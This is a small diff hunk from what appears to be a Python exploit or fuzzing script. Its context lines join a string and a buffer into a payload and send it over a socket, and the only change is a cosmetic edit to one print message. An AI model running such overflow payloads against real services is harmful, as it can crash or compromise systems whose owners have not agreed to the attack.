@@ -27,5 +27,5 @@ increment = buffer
 payload = string + buffer
 print("[+] Sending payload..")
 s.send(payload)
-print("[+] Payload sent!")
+print("[*] Payload sent!")
 s.close()
